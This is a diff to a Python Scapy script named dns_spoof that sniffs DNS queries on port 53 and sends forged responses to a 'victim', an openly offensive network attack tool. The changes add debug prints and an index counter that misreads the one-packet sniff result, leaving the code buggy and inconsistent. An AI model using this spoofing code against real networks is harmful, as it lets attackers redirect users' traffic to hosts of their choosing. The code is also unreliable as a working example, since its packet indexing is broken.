@@ -22,20 +22,24 @@ def dns_spoof():
     # sniff DNS traffic one at a time
     # , iface=argv[1]
     print("hoi2")
+    i = -1
     while 1:
         DNSpkt = sniff(count=1, filter="dst port 53")
-
+        print(DNSpkt)
+        print("test")
         # if it is a DNS request, start with creating response
-        if DNSpkt[0].haslayer(DNSQR):
+        i = i + 1
+        if DNSpkt[i].haslayer(DNSQR):
             # ignore this: alter_packet(DNSpkt)
+            print("test2")
             dstIP = DNSpkt.getlayer(IP).dst
             srcIP = DNSpkt.getlayer(IP).src
 
             # check if it is UDP or TCP traffic
-            if DNSpkt[0].haslayer(UDP):
+            if DNSpkt.haslayer(UDP):
                 dstPort = DNSpkt.getlayer(UDP).dport
                 srcPort = DNSpkt.getlayer(UDP).sport
-            elif DNSpkt[0].haslayer(TCP):
+            elif DNSpkt[i].haslayer(TCP):
                 dstPort = DNSpkt.getlayer(TCP).dport
                 srcPort = DNSpkt.getlayer(TCP).sport
 
@@ -57,6 +61,7 @@ def dns_spoof():
             # send packet to victim
             print(spoof_response)
             send(spoof_response)
+
         # elif: exit??
 
 
